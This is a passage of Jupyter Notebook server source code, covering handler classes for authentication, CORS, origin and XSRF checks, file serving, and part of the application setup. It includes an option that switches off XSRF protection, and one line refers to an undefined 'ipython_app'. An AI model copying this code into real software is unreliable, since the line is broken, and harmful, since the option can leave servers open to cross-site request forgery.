a token?\"\"\"\n        if self.login_handler is None or not hasattr(self.login_handler, 'is_token_authenticated'):\n            return False\n        return self.login_handler.is_token_authenticated(self)\n\n    @property\n    def cookie_name(self):\n        default_cookie_name = non_alphanum.sub('-', 'username-{}'.format(\n            self.request.host\n        ))\n        return self.settings.get('cookie_name', default_cookie_name)\n    \n    @property\n    def logged_in(self):\n        \"\"\"Is a user currently logged in?\"\"\"\n        user = self.get_current_user()\n        return (user and not user == 'anonymous')\n\n    @property\n    def login_handler(self):\n        \"\"\"Return the login handler for this application, if any.\"\"\"\n        return self.settings.get('login_handler_class', None)\n\n    @property\n    def token(self):\n        \"\"\"Return the login token for this application, if any.\"\"\"\n        return self.settings.get('token', None)\n\n    @property\n    def one_time_token(self):\n        \"\"\"Return the one-time-use token for this application, if any.\"\"\"\n        return self.settings.get('one_time_token', None)\n\n    @property\n    def login_available(self):\n        \"\"\"May a user proceed to log in?\n\n        This returns True if login capability is available, irrespective of\n        whether the user is already logged in or not.\n\n        \"\"\"\n        if self.login_handler is None:\n            return False\n        return bool(self.login_handler.get_login_available(self.settings))\n\n\nclass IPythonHandler(AuthenticatedHandler):\n    \"\"\"IPython-specific extensions to authenticated handling\n    \n    Mostly property shortcuts to IPython-specific settings.\n    \"\"\"\n\n    @property\n    def ignore_minified_js(self):\n        \"\"\"Wether to user bundle in template. (*.min files)\n        \n        Mainly use for development and avoid file recompilation\n        \"\"\"\n        return self.settings.get('ignore_minified_js', False)\n\n    @property\n    def config(self):\n        return self.settings.get('config', None)\n    \n    @property\n    def log(self):\n        \"\"\"use the IPython log by default, falling back on tornado's logger\"\"\"\n        return log()\n\n    @property\n    def jinja_template_vars(self):\n        \"\"\"User-supplied values to supply to jinja templates.\"\"\"\n        return self.settings.get('jinja_template_vars', {})\n    \n    #---------------------------------------------------------------\n    # URLs\n    #---------------------------------------------------------------\n    \n    @property\n    def version_hash(self):\n        \"\"\"The version hash to use for cache hints for static files\"\"\"\n        return self.settings.get('version_hash', '')\n    \n    @property\n    def mathjax_url(self):\n        url = self.settings.get('mathjax_url', '')\n        if not url or url_is_absolute(url):\n            return url\n        return url_path_join(self.base_url, url)\n    \n    @property\n    def mathjax_config(self):\n        return self.settings.get('mathjax_config', 'TeX-AMS-MML_HTMLorMML-full,Safe')\n\n    @property\n    def base_url(self):\n        return self.settings.get('base_url', '/')\n\n    @property\n    def default_url(self):\n        return self.settings.get('default_url', '')\n\n    @property\n    def ws_url(self):\n        return self.settings.get('websocket_url', '')\n\n    @property\n    def contents_js_source(self):\n        self.log.debug(\"Using contents: %s\", self.settings.get('contents_js_source',\n            'services/built/contents'))\n        return self.settings.get('contents_js_source', 'services/built/contents')\n    \n    #---------------------------------------------------------------\n    # Manager objects\n    #---------------------------------------------------------------\n    \n    @property\n    def kernel_manager(self):\n        return self.settings['kernel_manager']\n\n    @property\n    def contents_manager(self):\n        return self.settings['contents_manager']\n    \n    @property\n    def session_manager(self):\n        return self.settings['session_manager']\n    \n    @property\n    def terminal_manager(self):\n        return self.settings['terminal_manager']\n    \n    @property\n    def kernel_spec_manager(self):\n        return self.settings['kernel_spec_manager']\n\n    @property\n    def config_manager(self):\n        return self.settings['config_manager']\n\n    #---------------------------------------------------------------\n    # CORS\n    #---------------------------------------------------------------\n    \n    @property\n    def allow_origin(self):\n        \"\"\"Normal Access-Control-Allow-Origin\"\"\"\n        return self.settings.get('allow_origin', '')\n    \n    @property\n    def allow_origin_pat(self):\n        \"\"\"Regular expression version of allow_origin\"\"\"\n        return self.settings.get('allow_origin_pat', None)\n    \n    @property\n    def allow_credentials(self):\n        \"\"\"Whether to set Access-Control-Allow-Credentials\"\"\"\n        return self.settings.get('allow_credentials', False)\n    \n    def set_default_headers(self):\n        \"\"\"Add CORS headers, if defined\"\"\"\n        super(IPythonHandler, self).set_default_headers()\n        if self.allow_origin:\n            self.set_header(\"Access-Control-Allow-Origin\", self.allow_origin)\n        elif self.allow_origin_pat:\n            origin = self.get_origin()\n            if origin and self.allow_origin_pat.match(origin):\n                self.set_header(\"Access-Control-Allow-Origin\", origin)\n        if self.allow_credentials:\n            self.set_header(\"Access-Control-Allow-Credentials\", 'true')\n    \n    def get_origin(self):\n        # Handle WebSocket Origin naming convention differences\n        # The difference between version 8 and 13 is that in 8 the\n        # client sends a \"Sec-Websocket-Origin\" header and in 13 it's\n        # simply \"Origin\".\n        if \"Origin\" in self.request.headers:\n            origin = self.request.headers.get(\"Origin\")\n        else:\n            origin = self.request.headers.get(\"Sec-Websocket-Origin\", None)\n        return origin\n\n    # origin_to_satisfy_tornado is present because tornado requires\n    # check_origin to take an origin argument, but we don't use it\n    def check_origin(self, origin_to_satisfy_tornado=\"\"):\n        \"\"\"Check Origin for cross-site API requests, including websockets\n\n        Copied from WebSocket with changes:\n\n        - allow unspecified host/origin (e.g. scripts)\n        - allow token-authenticated requests\n        \"\"\"\n        if self.allow_origin == '*' or self.skip_check_origin():\n            return True\n\n        host = self.request.headers.get(\"Host\")\n        origin = self.request.headers.get(\"Origin\")\n\n        # If no header is provided, allow it.\n        # Origin can be None for:\n        # - same-origin (IE, Firefox)\n        # - Cross-site POST form (IE, Firefox)\n        # - Scripts\n        # The cross-site POST (XSRF) case is handled by tornado's xsrf_token\n        if origin is None or host is None:\n            return True\n\n        origin = origin.lower()\n        origin_host = urlparse(origin).netloc\n\n        # OK if origin matches host\n        if origin_host == host:\n            return True\n\n        # Check CORS headers\n        if self.allow_origin:\n            allow = self.allow_origin == origin\n        elif self.allow_origin_pat:\n            allow = bool(self.allow_origin_pat.match(origin))\n        else:\n            # No CORS headers deny the request\n            allow = False\n        if not allow:\n            self.log.warning(\"Blocking Cross Origin API request for %s.  Origin: %s, Host: %s\",\n                self.request.path, origin, host,\n            )\n        return allow\n\n    def check_xsrf_cookie(self):\n        \"\"\"Bypass xsrf checks when token-authenticated\"\"\"\n        if self.token_authenticated or self.settings.get('disable_check_xsrf', False):\n            # Token-authenticated requests do not need additional XSRF-check\n            # Servers without authentication are vulnerable to XSRF\n            return\n        return super(IPythonHandler, self).check_xsrf_cookie()\n\n    #---------------------------------------------------------------\n    # template rendering\n    #---------------------------------------------------------------\n    \n    def get_template(self, name):\n        \"\"\"Return the jinja template object for a given name\"\"\"\n        return self.settings['jinja2_env'].get_template(name)\n    \n    def render_template(self, name, **ns):\n        ns.update(self.template_namespace)\n        template = self.get_template(name)\n        return template.render(**ns)\n    \n    @property\n    def template_namespace(self):\n        return dict(\n            base_url=self.base_url,\n            default_url=self.default_url,\n            ws_url=self.ws_url,\n            logged_in=self.logged_in,\n            login_available=self.login_available,\n            token_available=bool(self.token or self.one_time_token),\n            static_url=self.static_url,\n            sys_info=sys_info,\n            contents_js_source=self.contents_js_source,\n            version_hash=self.version_hash,\n            ignore_minified_js=self.ignore_minified_js,\n            xsrf_form_html=self.xsrf_form_html,\n            token=self.token,\n            xsrf_token=self.xsrf_token.decode('utf8'),\n            **self.jinja_template_vars\n        )\n    \n    def get_json_body(self):\n        \"\"\"Return the body of the request as JSON data.\"\"\"\n        if not self.request.body:\n            return None\n        # Do we need to call body.decode('utf-8') here?\n        body = self.request.body.strip().decode(u'utf-8')\n        try:\n            model = json.loads(body)\n        except Exception:\n            self.log.debug(\"Bad JSON: %r\", body)\n            self.log.error(\"Couldn't parse JSON\", exc_info=True)\n            raise web.HTTPError(400, u'Invalid JSON in body of request')\n        return model\n\n    def write_error(self, status_code, **kwargs):\n        \"\"\"render custom error pages\"\"\"\n        exc_info = kwargs.get('exc_info')\n        message = ''\n        status_message = responses.get(status_code, 'Unknown HTTP Error')\n        exception = '(unknown)'\n        if exc_info:\n            exception = exc_info[1]\n            # get the custom message, if defined\n            try:\n                message = exception.log_message % exception.args\n            except Exception:\n                pass\n            \n            # construct the custom reason, if defined\n            reason = getattr(exception, 'reason', '')\n            if reason:\n                status_message = reason\n        \n        # build template namespace\n        ns = dict(\n            status_code=status_code,\n            status_message=status_message,\n            message=message,\n            exception=exception,\n        )\n        \n        self.set_header('Content-Type', 'text/html')\n        # render the template\n        try:\n            html = self.render_template('%s.html' % status_code, **ns)\n        except TemplateNotFound:\n            self.log.debug(\"No template for %d\", status_code)\n            html = self.render_template('error.html', **ns)\n        \n        self.write(html)\n\n\nclass APIHandler(IPythonHandler):\n    \"\"\"Base class for API handlers\"\"\"\n\n    def prepare(self):\n        if not self.check_origin():\n            raise web.HTTPError(404)\n        return super(APIHandler, self).prepare()\n\n    @property\n    def content_security_policy(self):\n        csp = '; '.join([\n                super(APIHandler, self).content_security_policy,\n                \"default-src 'none'\",\n            ])\n        return csp\n    \n    def finish(self, *args, **kwargs):\n        self.set_header('Content-Type', 'application/json')\n        return super(APIHandler, self).finish(*args, **kwargs)\n\n    def options(self, *args, **kwargs):\n        self.set_header('Access-Control-Allow-Headers', 'accept, content-type, authorization')\n        self.set_header('Access-Control-Allow-Methods',\n                        'GET, PUT, POST, PATCH, DELETE, OPTIONS')\n        self.finish()\n\n\nclass Template404(IPythonHandler):\n    \"\"\"Render our 404 template\"\"\"\n    def prepare(self):\n        raise web.HTTPError(404)\n\n\nclass AuthenticatedFileHandler(IPythonHandler, web.StaticFileHandler):\n    \"\"\"static files should only be accessible when logged in\"\"\"\n\n    @web.authenticated\n    def get(self, path):\n        if os.path.splitext(path)[1] == '.ipynb':\n            name = path.rsplit('/', 1)[-1]\n            self.set_header('Content-Type', 'application/json')\n            self.set_header('Content-Disposition','attachment; filename=\"%s\"' % escape.url_escape(name))\n        \n        return web.StaticFileHandler.get(self, path)\n    \n    def set_headers(self):\n        super(AuthenticatedFileHandler, self).set_headers()\n        # disable browser caching, rely on 304 replies for savings\n        if \"v\" not in self.request.arguments:\n            self.add_header(\"Cache-Control\", \"no-cache\")\n    \n    def compute_etag(self):\n        return None\n    \n    def validate_absolute_path(self, root, absolute_path):\n        \"\"\"Validate and return the absolute path.\n        \n        Requires tornado 3.1\n        \n        Adding to tornado's own handling, forbids the serving of hidden files.\n        \"\"\"\n        abs_path = super(AuthenticatedFileHandler, self).validate_absolute_path(root, absolute_path)\n        abs_root = os.path.abspath(root)\n        if is_hidden(abs_path, abs_root):\n            self.log.info(\"Refusing to serve hidden file, via 404 Error\")\n            raise web.HTTPError(404)\n        return abs_path\n\n\ndef json_errors(method):\n    \"\"\"Decorate methods with this to return GitHub style JSON errors.\n    \n    This should be used on any JSON API on any handler method that can raise HTTPErrors.\n    \n    This will grab the latest HTTPError exception using sys.exc_info\n    and then:\n    \n    1. Set the HTTP status code based on the HTTPError\n    2. Create and return a JSON body with a message field describing\n       the error in a human readable form.\n    \"\"\"\n    @functools.wraps(method)\n    @gen.coroutine\n    def wrapper(self, *args, **kwargs):\n        try:\n            result = yield gen.maybe_future(method(self, *args, **kwargs))\n        except web.HTTPError as e:\n            self.set_header('Content-Type', 'application/json')\n            status = e.status_code\n            message = e.log_message\n            self.log.warning(message)\n            self.set_status(e.status_code)\n            reply = dict(message=message, reason=e.reason)\n            self.finish(json.dumps(reply))\n        except Exception:\n            self.set_header('Content-Type', 'application/json')\n            self.log.error(\"Unhandled error in API request\", exc_info=True)\n            status = 500\n            message = \"Unknown server error\"\n            t, value, tb = sys.exc_info()\n            self.set_status(status)\n            tb_text = ''.join(traceback.format_exception(t, value, tb))\n            reply = dict(message=message, reason=None, traceback=tb_text)\n            self.finish(json.dumps(reply))\n        else:\n            # FIXME: can use regular return in generators in py3\n            raise gen.Return(result)\n    return wrapper\n\n\n\n#-----------------------------------------------------------------------------\n# File handler\n#-----------------------------------------------------------------------------\n\n# to minimize subclass changes:\nHTTPError = web.HTTPError\n\nclass FileFindHandler(IPythonHandler, web.StaticFileHandler):\n    \"\"\"subclass of StaticFileHandler for serving files from a search path\"\"\"\n    \n    # cache search results, don't search for files more than once\n    _static_paths = {}\n    \n    def set_headers(self):\n        super(FileFindHandler, self).set_headers()\n        # disable browser caching, rely on 304 replies for savings\n        if \"v\" not in self.request.arguments or \\\n                any(self.request.path.startswith(path) for path in self.no_cache_paths):\n            self.set_header(\"Cache-Control\", \"no-cache\")\n    \n    def initialize(self, path, default_filename=None, no_cache_paths=None):\n        self.no_cache_paths = no_cache_paths or []\n        \n        if isinstance(path, string_types):\n            path = [path]\n        \n        self.root = tuple(\n            os.path.abspath(os.path.expanduser(p)) + os.sep for p in path\n        )\n        self.default_filename = default_filename\n    \n    def compute_etag(self):\n        return None\n    \n    @classmethod\n    def get_absolute_path(cls, roots, path):\n        \"\"\"locate a file to serve on our static file search path\"\"\"\n        with cls._lock:\n            if path in cls._static_paths:\n                return cls._static_paths[path]\n            try:\n                abspath = os.path.abspath(filefind(path, roots))\n            except IOError:\n                # IOError means not found\n                return ''\n            \n            cls._static_paths[path] = abspath\n            \n\n            log().debug(\"Path %s served from %s\"%(path, abspath))\n            return abspath\n    \n    def validate_absolute_path(self, root, absolute_path):\n        \"\"\"check if the file should be served (raises 404, 403, etc.)\"\"\"\n        if absolute_path == '':\n            raise web.HTTPError(404)\n        \n        for root in self.root:\n            if (absolute_path + os.sep).startswith(root):\n                break\n        \n        return super(FileFindHandler, self).validate_absolute_path(root, absolute_path)\n\n\nclass APIVersionHandler(APIHandler):\n\n    @json_errors\n    def get(self):\n        # not authenticated, so give as few info as possible\n        self.finish(json.dumps({\"version\":notebook.__version__}))\n\n\nclass TrailingSlashHandler(web.RequestHandler):\n    \"\"\"Simple redirect handler that strips trailing slashes\n    \n    This should be the first, highest priority handler.\n    \"\"\"\n    \n    def get(self):\n        self.redirect(self.request.uri.rstrip('/'))\n    \n    post = put = get\n\n\nclass FilesRedirectHandler(IPythonHandler):\n    \"\"\"Handler for redirecting relative URLs to the /files/ handler\"\"\"\n    \n    @staticmethod\n    def redirect_to_files(self, path):\n        \"\"\"make redirect logic a reusable static method\n        \n        so it can be called from other handlers.\n        \"\"\"\n        cm = self.contents_manager\n        if cm.dir_exists(path):\n            # it's a *directory*, redirect to /tree\n            url = url_path_join(self.base_url, 'tree', url_escape(path))\n        else:\n            orig_path = path\n            # otherwise, redirect to /files\n            parts = path.split('/')\n\n            if not cm.file_exists(path=path) and 'files' in parts:\n                # redirect without files/ iff it would 404\n                # this preserves pre-2.0-style 'files/' links\n                self.log.warning(\"Deprecated files/ URL: %s\", orig_path)\n                parts.remove('files')\n                path = '/'.join(parts)\n\n            if not cm.file_exists(path=path):\n                raise web.HTTPError(404)\n\n            url = url_path_join(self.base_url, 'files', url_escape(path))\n        self.log.debug(\"Redirecting %s to %s\", self.request.path, url)\n        self.redirect(url)\n    \n    def get(self, path=''):\n        return self.redirect_to_files(self, path)\n\n\nclass RedirectWithParams(web.RequestHandler):\n    \"\"\"Sam as web.RedirectHandler, but preserves URL parameters\"\"\"\n    def initialize(self, url, permanent=True):\n        self._url = url\n        self._permanent = permanent\n\n    def get(self):\n        sep = '&' if '?' in self._url else '?'\n        url = sep.join([self._url, self.request.query])\n        self.redirect(url, permanent=self._permanent)\n\n#-----------------------------------------------------------------------------\n# URL pattern fragments for re-use\n#-----------------------------------------------------------------------------\n\n# path matches any number of `/foo[/bar...]` or just `/` or ''\npath_regex = r\"(?P<path>(?:(?:/[^/]+)+|/?))\"\n\n#-----------------------------------------------------------------------------\n# URL to handler mappings\n#-----------------------------------------------------------------------------\n\n\ndefault_handlers = [\n    (r\".*/\", TrailingSlashHandler),\n    (r\"api\", APIVersionHandler)\n]\n/n/n/nnotebook/notebookapp.py/n/n# coding: utf-8\n\"\"\"A tornado based Jupyter notebook server.\"\"\"\n\n# Copyright (c) Jupyter Development Team.\n# Distributed under the terms of the Modified BSD License.\n\nfrom __future__ import absolute_import, print_function\n\nimport binascii\nimport datetime\nimport errno\nimport importlib\nimport io\nimport json\nimport logging\nimport mimetypes\nimport os\nimport random\nimport re\nimport select\nimport signal\nimport socket\nimport sys\nimport threading\nimport warnings\nimport webbrowser\n\ntry: #PY3\n    from base64 import encodebytes\nexcept ImportError: #PY2\n    from base64 import encodestring as encodebytes\n\n\nfrom jinja2 import Environment, FileSystemLoader\n\n# Install the pyzmq ioloop. This has to be done before anything else from\n# tornado is imported.\nfrom zmq.eventloop import ioloop\nioloop.install()\n\n# check for tornado 3.1.0\nmsg = \"The Jupyter Notebook requires tornado >= 4.0\"\ntry:\n    import tornado\nexcept ImportError:\n    raise ImportError(msg)\ntry:\n    version_info = tornado.version_info\nexcept AttributeError:\n    raise ImportError(msg + \", but you have < 1.1.0\")\nif version_info < (4,0):\n    raise ImportError(msg + \", but you have %s\" % tornado.version)\n\nfrom tornado import httpserver\nfrom tornado import web\nfrom tornado.httputil import url_concat\nfrom tornado.log import LogFormatter, app_log, access_log, gen_log\n\nfrom notebook import (\n    DEFAULT_STATIC_FILES_PATH,\n    DEFAULT_TEMPLATE_PATH_LIST,\n    __version__,\n)\n\n# py23 compatibility\ntry:\n    raw_input = raw_input\nexcept NameError:\n    raw_input = input\n\nfrom .base.handlers import Template404, RedirectWithParams\nfrom .log import log_request\nfrom .services.kernels.kernelmanager import MappingKernelManager\nfrom .services.config import ConfigManager\nfrom .services.contents.manager import ContentsManager\nfrom .services.contents.filemanager import FileContentsManager\nfrom .services.sessions.sessionmanager import SessionManager\n\nfrom .auth.login import LoginHandler\nfrom .auth.logout import LogoutHandler\nfrom .base.handlers import FileFindHandler\n\nfrom traitlets.config import Config\nfrom traitlets.config.application import catch_config_error, boolean_flag\nfrom jupyter_core.application import (\n    JupyterApp, base_flags, base_aliases,\n)\nfrom jupyter_client import KernelManager\nfrom jupyter_client.kernelspec import KernelSpecManager, NoSuchKernel, NATIVE_KERNEL_NAME\nfrom jupyter_client.session import Session\nfrom nbformat.sign import NotebookNotary\nfrom traitlets import (\n    Dict, Unicode, Integer, List, Bool, Bytes, Instance,\n    TraitError, Type, Float, observe, default, validate\n)\nfrom ipython_genutils import py3compat\nfrom jupyter_core.paths import jupyter_runtime_dir, jupyter_path\nfrom notebook._sysinfo import get_sys_info\n\nfrom .utils import url_path_join, check_pid, url_escape\n\n#-----------------------------------------------------------------------------\n# Module globals\n#-----------------------------------------------------------------------------\n\n_examples = \"\"\"\njupyter notebook                       # start the notebook\njupyter notebook --certfile=mycert.pem # use SSL/TLS certificate\n\"\"\"\n\nDEV_NOTE_NPM = \"\"\"It looks like you're running the notebook from source.\nIf you're working on the Javascript of the notebook, try running\n\n    npm run build:watch\n\nin another terminal window to have the system incrementally\nwatch and build the notebook's JavaScript for you, as you make changes.\n\"\"\"\n\n#-----------------------------------------------------------------------------\n# Helper functions\n#-----------------------------------------------------------------------------\n\ndef random_ports(port, n):\n    \"\"\"Generate a list of n random ports near the given port.\n\n    The first 5 ports will be sequential, and the remaining n-5 will be\n    randomly selected in the range [port-2*n, port+2*n].\n    \"\"\"\n    for i in range(min(5, n)):\n        yield port + i\n    for i in range(n-5):\n        yield max(1, port + random.randint(-2*n, 2*n))\n\ndef load_handlers(name):\n    \"\"\"Load the (URL pattern, handler) tuples for each component.\"\"\"\n    name = 'notebook.' + name\n    mod = __import__(name, fromlist=['default_handlers'])\n    return mod.default_handlers\n\n#-----------------------------------------------------------------------------\n# The Tornado web application\n#-----------------------------------------------------------------------------\n\nclass NotebookWebApplication(web.Application):\n\n    def __init__(self, jupyter_app, kernel_manager, contents_manager,\n                 session_manager, kernel_spec_manager,\n                 config_manager, log,\n                 base_url, default_url, settings_overrides, jinja_env_options):\n\n        # If the user is running the notebook in a git directory, make the assumption\n        # that this is a dev install and suggest to the developer `npm run build:watch`.\n        base_dir = os.path.realpath(os.path.join(__file__, '..', '..'))\n        dev_mode = os.path.exists(os.path.join(base_dir, '.git'))\n        if dev_mode:\n            log.info(DEV_NOTE_NPM)\n\n        settings = self.init_settings(\n            jupyter_app, kernel_manager, contents_manager,\n            session_manager, kernel_spec_manager, config_manager, log, base_url,\n            default_url, settings_overrides, jinja_env_options)\n        handlers = self.init_handlers(settings)\n\n        super(NotebookWebApplication, self).__init__(handlers, **settings)\n\n    def init_settings(self, jupyter_app, kernel_manager, contents_manager,\n                      session_manager, kernel_spec_manager,\n                      config_manager,\n                      log, base_url, default_url, settings_overrides,\n                      jinja_env_options=None):\n\n        _template_path = settings_overrides.get(\n            \"template_path\",\n            jupyter_app.template_file_path,\n        )\n        if isinstance(_template_path, py3compat.string_types):\n            _template_path = (_template_path,)\n        template_path = [os.path.expanduser(path) for path in _template_path]\n\n        jenv_opt = {\"autoescape\": True}\n        jenv_opt.update(jinja_env_options if jinja_env_options else {})\n\n        env = Environment(loader=FileSystemLoader(template_path), **jenv_opt)\n        \n        sys_info = get_sys_info()\n        if sys_info['commit_source'] == 'repository':\n            # don't cache (rely on 304) when working from master\n            version_hash = ''\n        else:\n            # reset the cache on server restart\n            version_hash = datetime.datetime.now().strftime(\"%Y%m%d%H%M%S\")\n\n        if jupyter_app.ignore_minified_js:\n            log.warning(\"\"\"The `ignore_minified_js` flag is deprecated and no \n                longer works.  Alternatively use `npm run build:watch` when\n                working on the notebook's Javascript and LESS\"\"\")\n            warnings.warn(\"The `ignore_minified_js` flag is deprecated and will be removed in Notebook 6.0\", DeprecationWarning)\n\n        settings = dict(\n            # basics\n            log_function=log_request,\n            base_url=base_url,\n            default_url=default_url,\n            template_path=template_path,\n            static_path=jupyter_app.static_file_path,\n            static_custom_path=jupyter_app.static_custom_path,\n            static_handler_class = FileFindHandler,\n            static_url_prefix = url_path_join(base_url,'/static/'),\n            static_handler_args = {\n                # don't cache custom.js\n                'no_cache_paths': [url_path_join(base_url, 'static', 'custom')],\n            },\n            version_hash=version_hash,\n            ignore_minified_js=jupyter_app.ignore_minified_js,\n            \n            # rate limits\n            iopub_msg_rate_limit=jupyter_app.iopub_msg_rate_limit,\n            iopub_data_rate_limit=jupyter_app.iopub_data_rate_limit,\n            rate_limit_window=jupyter_app.rate_limit_window,\n            \n            # authentication\n            cookie_secret=jupyter_app.cookie_secret,\n            login_url=url_path_join(base_url,'/login'),\n            login_handler_class=jupyter_app.login_handler_class,\n            logout_handler_class=jupyter_app.logout_handler_class,\n            password=jupyter_app.password,\n            xsrf_cookies=True,\n            disable_check_xsrf=ipython_app.disable_check_xsrf,\n\n            # managers\n            kernel_manager=kernel_manager,\n            contents_manager=contents_manager,\n            session_manager=session_manager,\n            kernel_spec_manager=kernel_spec_manager,\n            config_manager=config_manager,\n\n            # IPython stuff\n            jinja_template_vars=jupyter_app.jinja_template_vars,\n            nbextensions_path=jupyter_app.nbextensions_path,\n            websocket_url=jupyter_app.websocket_url,\n            mathjax_url=jupyter_app.mathjax_url,\n            mathjax_config=jupyter_app.mathjax_config,\n            config=jupyter_app.config,\n            config_dir=jupyter_app.config_dir,\n            jinja2_env=env,\n            terminals_available=False,  # Set later if terminals are available\n        )\n\n        # allow custom overrides for the tornado web app.\n        settings.update(settings_overrides)\n        return settings\n\n    def init_handlers(self, settings):\n        \"\"\"Load the (URL pattern, handler) tuples for each component.\"\"\"\n        \n        # Order matters. The first handler to match the URL will handle the request.\n        handlers = []\n        handlers.extend(load_handlers('tree.handlers'))\n        handlers.extend([(r\"/login\", settings['login_handler_class'])])\n        handlers.extend([(r\"/logout\", settings['logout_handler_class'])])\n        handlers.extend(load_handlers('files.handlers'))\n        handlers.extend(load_handlers('notebook.handlers'))\n        handlers.extend(load_handlers('nbconvert.handlers'))\n        handlers.extend(load_handlers('bundler.handlers'))\n        handlers.extend(load_handlers('kernelspecs.handlers'))\n        handlers.extend(load_handlers('edit.handlers'))\n        handlers.extend(load_handlers('services.api.handlers'))\n        handlers.extend(load_handlers('services.config.handlers'))\n        handlers.extend(load_handlers('services.kernels.handlers'))\n        handlers.extend(load_handlers('services.contents.handlers'))\n        handlers.extend(load_handlers('services.sessions.handlers'))\n        handlers.extend(load_handlers('services.nbconvert.handlers'))\n        handlers.extend(load_handlers('services.kernelspecs.handlers'))\n        handlers.extend(load_handlers('services.security.handlers'))\n        \n        # BEGIN HARDCODED WIDGETS HACK\n        # TODO: Remove on notebook 5.0\n        widgets = None\n        try:\n            import widgetsnbextension\n        except:\n            try:\n                import ipywidgets as widgets\n                handlers.append(\n                    (r\"/nbextensions/widgets/(.*)\", FileFindHandler, {\n                        'path': widgets.find_static_assets(),\n                        'no_cache_paths': ['/'], # don't cache anything in nbextensions\n                    }),\n                )\n            except:\n                app_log.warning('Widgets are unavailable. Please install widgetsnbextension or ipywidgets 4.0')\n        # END HARDCODED WIDGETS HACK\n        \n        handlers.append(\n            (r\"/nbextensions/(.*)\", FileFindHandler, {\n                'path': settings['nbextensions_path'],\n                'no_cache_paths': ['/'], # don't cache anything in nbextensions\n            }),\n        )\n        handlers.append(\n            (r\"/custom/(.*)\", FileFindHandler, {\n                'path': settings['static_custom_path'],\n                'no_cache_paths': ['/'], # don't cache anything in custom\n            })\n        )\n        # register base handlers last\n        handlers.extend(load_handlers('base.handlers'))\n        # set the URL that will be redirected from `/`\n        handlers.append(\n            (r'/?', RedirectWithParams, {\n                'url' : settings['default_url'],\n                'permanent': False, # want 302, not 301\n            })\n        )\n\n        # prepend base_url onto the patterns that we match\n        new_handlers = []\n        for handler in handlers:\n            pattern = url_path_join(settings['base_url'], handler[0])\n            new_handler = tuple([pattern] + list(handler[1:]))\n            new_handlers.append(new_handler)\n        # add 404 on the end, which will catch everything that falls through\n        new_handlers.append((r'(.*)', Template404))\n        return new_handlers\n\n\nclass NbserverListApp(JupyterApp):\n    version = __version__\n    description=\"List currently running notebook servers.\"\n    \n    flags = dict(\n        json=({'NbserverListApp': {'json': True}},\n              \"Produce machine-readable JSON output.\"),\n    )\n    \n    json = Bool(False, config=True,\n          help=\"If True, each line of output will be a JSON object with the \"\n                  \"details from the server info file.\")\n\n    def start(self):\n        if not self.json:\n            print(\"Currently running servers:\")\n        for serverinfo in list_running_servers(self.runtime_dir):\n            if self.json:\n                print(json.dumps(serverinfo))\n            else:\n                url = serverinfo['url']\n                if serverinfo.get('token'):\n                    url = url + '?token=%s' % serverinfo['token']\n                print(url, \"::\", serverinfo['notebook_dir'])\n\n#-----------------------------------------------------------------------------\n# Aliases and Flags\n#-----------------------------------------------------------------------------\n\nflags = dict(base_flags)\nflags['no-browser']=(\n    {'NotebookApp' : {'open_browser' : False}},\n    \"Don't open the notebook in a browser after startup.\"\n)\nflags['pylab']=(\n    {'NotebookApp' : {'pylab' : 'warn'}},\n    \"DISABLED: use %pylab or %matplotlib in the notebook to enable matplotlib.\"\n)\nflags['no-mathjax']=(\n    {'NotebookApp' : {'enable_mathjax' : False}},\n    \"\"\"Disable MathJax\n    \n    MathJax is the javascript library Jupyter uses to render math/LaTeX. It is\n    very large, so you may want to disable it if you have a slow internet\n    connection, or for offline use of the notebook.\n    \n    When disabled, equations etc. will appear as their untransformed TeX source.\n    \"\"\"\n)\n\nflags['allow-root']=(\n    {'NotebookApp' : {'allow_root' : True}},\n    \"Allow the notebook to be run from root user.\"\n)\n\n# Add notebook manager flags\nflags.update(boolean_flag('script', 'FileContentsManager.save_script',\n               'DEPRECATED, IGNORED',\n               'DEPRECATED, IGNORED'))\n\naliases = dict(base_aliases)\n\naliases.update({\n    'ip': 'NotebookApp.ip',\n    'port': 'NotebookApp.port',\n    'port-retries': 'NotebookApp.port_retries',\n    'transport': 'KernelManager.transport',\n    'keyfile': 'NotebookApp.keyfile',\n    'certfile': 'NotebookApp.certfile',\n    'client-ca': 'NotebookApp.client_ca',\n    'notebook-dir': 'NotebookApp.notebook_dir',\n    'browser': 'NotebookApp.browser',\n    'pylab': 'NotebookApp.pylab',\n})\n\n#-----------------------------------------------------------------------------\n# NotebookApp\n#-----------------------------------------------------------------------------\n\nclass NotebookApp(JupyterApp):\n\n    name = 'jupyter-notebook'\n    version = __version__\n    description = \"\"\"\n        The Jupyter HTML Notebook.\n        \n        This launches a Tornado based HTML Notebook Server that serves up an\n        HTML5/Javascript Notebook client.\n    \"\"\"\n    examples = _examples\n    aliases = aliases\n    flags = flags\n    \n    classes = [\n        KernelManager, Session, MappingKernelManager,\n        ContentsManager, FileContentsManager, NotebookNotary,\n        KernelSpecManager,\n    ]\n    flags = Dict(flags)\n    aliases = Dict(aliases)\n    \n    subcommands = dict(\n        list=(NbserverListApp, NbserverListApp.description.splitlines()[0]),\n    )\n\n    _log_formatter_cls = LogFormatter\n\n    @default('log_level')\n    def _default_log_level(self):\n        return logging.INFO\n\n    @default('log_datefmt')\n    def _default_log_datefmt(self):\n        \"\"\"Exclude date from default date format\"\"\"\n        return \"%H:%M:%S\"\n    \n    @default('log_format')\n    def _default_log_format(self):\n        \"\"\"override default log format to include time\"\"\"\n        return u\"%(color)s[%(levelname)1.1s %(asctime)s.%(msecs).03d %(name)s]%(end_color)s %(message)s\"\n\n    ignore_minified_js = Bool(False,\n            config=True,\n            help='Deprecated: Use minified JS file or not, mainly use during dev to avoid JS recompilation', \n            )\n\n    # file to be opened in the notebook server\n    file_to_run = Unicode('', config=True)\n\n    # Network related information\n    \n    allow_origin = Unicode('', config=True,\n        help=\"\"\"Set the Access-Control-Allow-Origin header\n        \n        Use '*' to allow any origin to access your server.\n        \n        Takes precedence over allow_origin_pat.\n        \"\"\"\n    )\n    \n    allow_origin_pat = Unicode('', config=True,\n        help=\"\"\"Use a regular expression for the Access-Control-Allow-Origin header\n        \n        Requests from an origin matching the expression will get replies with:\n        \n            Access-Control-Allow-Origin: origin\n        \n        where `origin` is the origin of the request.\n        \n        Ignored if allow_origin is set.\n        \"\"\"\n    )\n    \n    allow_credentials = Bool(False, config=True,\n        help=\"Set the Access-Control-Allow-Credentials: true header\"\n    )\n    \n    allow_root = Bool(False, config=True, \n        help=\"Whether to allow the user to run the notebook as root.\"\n    )\n\n    default_url = Unicode('/tree', config=True,\n        help=\"The default URL to redirect to from `/`\"\n    )\n    \n    ip = 